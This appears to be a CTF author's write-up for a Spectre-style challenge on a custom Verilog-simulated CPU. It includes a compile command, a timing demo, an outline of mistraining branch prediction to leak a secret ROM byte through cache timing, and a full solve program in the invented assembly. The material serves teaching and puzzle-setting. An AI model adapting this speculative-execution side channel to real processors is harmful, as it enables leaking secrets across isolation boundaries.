Compile with: 
```bash
iverilog -g2012 -o nco ncore_tb.v
```
Try this program:
```
MOVFSI R0 R1 1
INC R3
INC R3
RDTM R1
MOVF R0 108
RDTM R1
MOVF R0 110
RDTM R1
MOVF R0 110
RDTM R1
```
It shows how cached accesses take 4 ticks, while uncached takes 8. I think it basically works, we just need a solve to make sure...

## The outline
Fool branch prediction to speculatively do a _MOVFSI R1,R0,IMM_ (which WONT get executed, otherwise you lock the core) now the result is in cache, try different Xs to load _MOVF X_ and time them, if it takes 4 clock, X is the value in _SAFE\_ROM\[IMM\]_.

## Epistemological Commentary
What does a challenge measure? How can we measure the skill of shellcoding? Say for a typical pwn problem, we are almost always measuring multiple skills and knowledge: familiarity with the underlying arch (x86/arm/etc) with the type of vuln, with the tools of the trade and so on. Then a curious mind may posit that we cannot ever distinguish a skill in isolation from other knowledge with a challenge. </br> 

I challenge this assumption, what if the ISA was not a known ISA? What if there wasn't much tools could do? In this challenge, it would be rather easy to find out it's supposed to be a cache side-channel, it's really so on the nose. Next would be to hatch a plan and shellcode the idea to fruition, with no known ISA and no specific tool able to help, it is kind of a pure challenge of shellcoding in some made-up ISA you just saw. It is not easy, and prone to mistakes, but give the verilog source, it also would demonstrate the value of debugging, and the tool is VVP/IVERILOG, not something that people would usually be doing in every CTF, with an exotic ting to it. & finally there is a cool factor, because of all the hype SPECTRE got, and hopefully people would come away with a sense of accomplishment after solving this.

## Solve Works!
It ain't pretty. It ain't pretty at all. But now it works, the following is a solve which does spit out the flag: 
```
FLUSH
INC R1
JGT R0 R1 0
JGT R0 R1 0
JGT R0 R1 0
JGT R0 R1 0
JGT R1 R0 16
MOVFSI R0 R3 0
RDTM R1
MOVFU R2 0
RDTM R2
SUB R2 R2 R1
MOVFU R1 58
JEQ R2 R1 34
INC R0
MOVT R0 19
JMP 16
MOVT R0 200
MOVF R1 35
INC R1
MOVT R1 35
MOVF R1 15
INC R1
MOVT R1 15
MOVF R1 56
MOVF R0 56
MOVT R0 19
JMP 0
00 00
04 00
```
